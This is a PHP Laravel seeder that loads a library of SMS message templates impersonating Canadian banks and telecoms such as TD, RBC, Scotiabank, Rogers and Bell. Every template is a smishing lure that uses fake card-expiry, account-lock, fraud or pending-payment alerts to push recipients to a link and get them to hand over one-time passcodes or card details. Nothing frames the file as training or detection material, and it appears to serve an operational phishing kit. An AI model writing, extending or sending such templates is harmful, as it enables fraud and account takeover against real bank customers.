<?php

namespace Database\Seeders;

use App\Models\Template;
use Illuminate\Database\Seeder;

class TemplateLibrarySeeder extends Seeder
{
    public function run(): void
    {
        $templates = [
            // ── Card Expiry ──────────────────────────────────────────────
            [
                'name'        => 'Rogers – Card Expiry Warning',
                'message'     => 'URGENT: Your Rogers card ending ****{last4} expires in 48hrs. Verify now to avoid service interruption: {link}',
                'category'    => 'card_expiry',
                'bank'        => 'Rogers',
                'preview'     => 'Card ends in 48hrs — tap link to verify',
            ],
            [
                'name'        => 'Bell – Card Expiry Reminder',
                'message'     => 'Bell Mobility: Your card ****{last4} expires soon. Update your card details now to keep your service active: {link}',
                'category'    => 'card_expiry',
                'bank'        => 'Bell',
                'preview'     => 'Card expires soon — update now',
            ],
            [
                'name'        => 'Telus – Card Renewal',
                'message'     => 'Telus: Your credit card ****{last4} is up for renewal. Confirm your details before your service is suspended: {link}',
                'category'    => 'card_expiry',
                'bank'        => 'Telus',
                'preview'     => 'Card renewal — confirm before suspension',
            ],
            [
                'name'        => 'TD Bank – Card Expiring',
                'message'     => 'TD Bank: Your card ****{last4} expires in 7 days. Renew now to avoid a temporary hold on your account: {link}',
                'category'    => 'card_expiry',
                'bank'        => 'TD Bank',
                'preview'     => 'Card expires in 7 days — renew now',
            ],
            [
                'name'        => 'RBC – Card Renewal Notice',
                'message'     => 'RBC: Your debit card ****{last4} is expiring. Verify your information to receive your new card: {link}',
                'category'    => 'card_expiry',
                'bank'        => 'RBC',
                'preview'     => 'Debit card expiring — verify to receive new card',
            ],

            // ── Delivery Failed ──────────────────────────────────────────
            [
                'name'        => 'Generic – Delivery Failed, Re-verify',
                'message'     => 'Your delivery attempt failed. A new PIN was issued for your account. Enter your OTP to confirm: {otp_link}',
                'category'    => 'delivery_failed',
                'bank'        => null,
                'preview'     => 'Delivery failed — enter OTP to confirm',
            ],
            [
                'name'        => 'TD Bank – Package Delivery Failed',
                'message'     => 'TD Bank: Your secure package delivery failed. Re-enter your verification code to complete delivery: {link} (OTP: {otp_code})',
                'category'    => 'delivery_failed',
                'bank'        => 'TD Bank',
                'preview'     => 'Package delivery failed — re-enter OTP',
            ],
            [
                'name'        => 'RBC – Delivery Re-attempt Required',
                'message'     => 'RBC: Your payment delivery needs your attention. A new code has been sent to your phone. Enter it below: {link}',
                'category'    => 'delivery_failed',
                'bank'        => 'RBC',
                'preview'     => 'Delivery re-attempt — enter new code',
            ],

            // ── Account Locked ───────────────────────────────────────────
            [
                'name'        => 'TD Bank – Account Locked',
                'message'     => 'TD Bank: Your online banking account has been locked due to unusual activity. Enter your 6-digit OTP to unlock: {link}',
                'category'    => 'account_locked',
                'bank'        => 'TD Bank',
                'preview'     => 'Account locked — enter OTP to unlock',
            ],
            [
                'name'        => 'Scotiabank – Account Temporarily Locked',
                'message'     => 'Scotiabank: Your account is temporarily locked. A verification code was sent to your mobile. Enter it to restore access: {link}',
                'category'    => 'account_locked',
                'bank'        => 'Scotiabank',
                'preview'     => 'Account locked — enter code to restore access',
            ],
            [
                'name'        => 'CIBC – Account Lock Alert',
                'message'     => 'CIBC: Unusual login detected. Your account is now locked. Enter the OTP sent to your phone to unlock immediately: {link}',
                'category'    => 'account_locked',
                'bank'        => 'CIBC',
                'preview'     => 'Unusual login — account locked, enter OTP',
            ],
            [
                'name'        => 'BMO – Account Security Lock',
                'message'     => 'BMO: Your account has been locked for security. Verify with the code sent to your mobile to continue: {link}',
                'category'    => 'account_locked',
                'bank'        => 'BMO',
                'preview'     => 'Security lock — verify with mobile code',
            ],

            // ── Login Alert / 2FA ────────────────────────────────────────
            [
                'name'        => 'Rogers – New Login Detected (2FA)',
                'message'     => 'Rogers: New login detected from a new device. Enter the 6-digit code sent to your phone to approve: {link}',
                'category'    => 'login_alert',
                'bank'        => 'Rogers',
                'preview'     => 'New login from new device — enter 2FA code',
            ],
            [
                'name'        => 'Bell – Login Verification Required',
                'message'     => 'Bell: A login was attempted from an unknown device. Enter your OTP to approve or deny access: {link}',
                'category'    => 'login_alert',
                'bank'        => 'Bell',
                'preview'     => 'Login from unknown device — approve or deny',
            ],
            [
                'name'        => 'Telus – Two-Factor Authentication',
                'message'     => 'Telus: 2FA required for this session. Enter the verification code sent to your mobile number: {link}',
                'category'    => 'login_alert',
                'bank'        => 'Telus',
                'preview'     => '2FA required — enter mobile code',
            ],
            [
                'name'        => 'Desjardins – Login OTP Verification',
                'message'     => 'Desjardins: Verify this login by entering the 6-digit code sent to your phone. Code valid for 5 minutes: {link}',
                'category'    => 'login_alert',
                'bank'        => 'Desjardins',
                'preview'     => 'Verify login — code valid 5 min',
            ],

            // ── Payment Pending ──────────────────────────────────────────
            [
                'name'        => 'Rogers – Payment Pending Approval',
                'message'     => 'Rogers: Your payment of ${amount} is pending. Enter the OTP sent to your phone to approve: {link}',
                'category'    => 'payment_pending',
                'bank'        => 'Rogers',
                'preview'     => 'Payment ${amount} pending — enter OTP to approve',
            ],
            [
                'name'        => 'Bell – Bill Payment Requires OTP',
                'message'     => 'Bell: Your monthly bill of ${amount} needs your approval. Enter the code below to pay now: {link}',
                'category'    => 'payment_pending',
                'bank'        => 'Bell',
                'preview'     => 'Bill ${amount} — enter code to pay',
            ],
            [
                'name'        => 'TD Bank – Transfer Awaiting Confirmation',
                'message'     => 'TD Bank: Your transfer of ${amount} to ****{last4} is awaiting confirmation. Enter your OTP: {link}',
                'category'    => 'payment_pending',
                'bank'        => 'TD Bank',
                'preview'     => 'Transfer ${amount} — enter OTP to confirm',
            ],
            [
                'name'        => 'RBC – Pending Transaction Alert',
                'message'     => 'RBC: A transaction of ${amount} is pending on your card. Approve with the OTP sent to your phone: {link}',
                'category'    => 'payment_pending',
                'bank'        => 'RBC',
                'preview'     => 'Transaction ${amount} — approve with OTP',
            ],

            // ── Security Check ───────────────────────────────────────────
            [
                'name'        => 'TD Bank – Security Verification',
                'message'     => 'TD Bank: A security check is required to protect your account. Enter the verification code: {link}',
                'category'    => 'security_check',
                'bank'        => 'TD Bank',
                'preview'     => 'Security check — enter verification code',
            ],
            [
                'name'        => 'Scotiabank – Account Security Review',
                'message'     => 'Scotiabank: We noticed unusual activity. Complete this security check to keep your account safe: {link}',
                'category'    => 'security_check',
                'bank'        => 'Scotiabank',
                'preview'     => 'Unusual activity — complete security check',
            ],
            [
                'name'        => 'CIBC – Identity Verification Required',
                'message'     => 'CIBC: Verify your identity to prevent unauthorized access. Enter the OTP sent to your mobile: {link}',
                'category'    => 'security_check',
                'bank'        => 'CIBC',
                'preview'     => 'Verify identity — enter mobile OTP',
            ],

            // ── Interac e-Transfer Request ───────────────────────────────
            [
                'name'        => 'Interac – e-Transfer Request Pending',
                'message'     => 'Interac: A new e-Transfer request of ${amount} is waiting. Enter your OTP to accept: {link}',
                'category'    => 'interac_request',
                'bank'        => null,
                'preview'     => 'e-Transfer ${amount} — enter OTP to accept',
            ],
            [
                'name'        => 'TD Interac – Incoming Transfer',
                'message'     => 'TD Interac: Someone sent you ${amount} via e-Transfer. Enter the 6-digit code to receive it: {link}',
                'category'    => 'interac_request',
                'bank'        => 'TD Bank',
                'preview'     => 'Incoming e-Transfer — enter code to receive',
            ],
            [
                'name'        => 'RBC Interac – Transfer Approval Needed',
                'message'     => 'RBC Interac: An e-Transfer of ${amount} requires your approval. Enter the OTP sent to your phone: {link}',
                'category'    => 'interac_request',
                'bank'        => 'RBC',
                'preview'     => 'e-Transfer — approve with OTP',
            ],

            // ── Fraud Alert ──────────────────────────────────────────────
            [
                'name'        => 'Rogers – Fraud Alert: Card Used',
                'message'     => 'Rogers: Card ****{last4} used at an unusual location. Enter your OTP to confirm this was you: {link}',
                'category'    => 'fraud_alert',
                'bank'        => 'Rogers',
                'preview'     => 'Card used at unusual location — confirm with OTP',
            ],
            [
                'name'        => 'Bell – Suspected Fraud on Your Account',
                'message'     => 'Bell: We detected suspicious activity on your account. Verify with the code below to block it: {link}',
                'category'    => 'fraud_alert',
                'bank'        => 'Bell',
                'preview'     => 'Suspicious activity — verify to block',
            ],
            [
                'name'        => 'TD Bank – Fraud Alert: New Device',
                'message'     => 'TD Bank: A new device accessed your account. This may be fraud. Enter your OTP to approve or deny: {link}',
                'category'    => 'fraud_alert',
                'bank'        => 'TD Bank',
                'preview'     => 'New device — approve or deny with OTP',
            ],
            [
                'name'        => 'Scotiabank – Fraud Detection Alert',
                'message'     => 'Scotiabank: Our fraud system flagged a transaction of ${amount}. Enter your code to confirm or cancel: {link}',
                'category'    => 'fraud_alert',
                'bank'        => 'Scotiabank',
                'preview'     => 'Fraud flagged — confirm or cancel transaction',
            ],
        ];

        foreach ($templates as $data) {
            Template::firstOrCreate(
                ['name' => $data['name'], 'is_library' => true],
                array_merge($data, [
                    'user_id'  => 1,
                    'status'   => 1,
                    'is_library' => true,
                ])
            );
        }
    }
}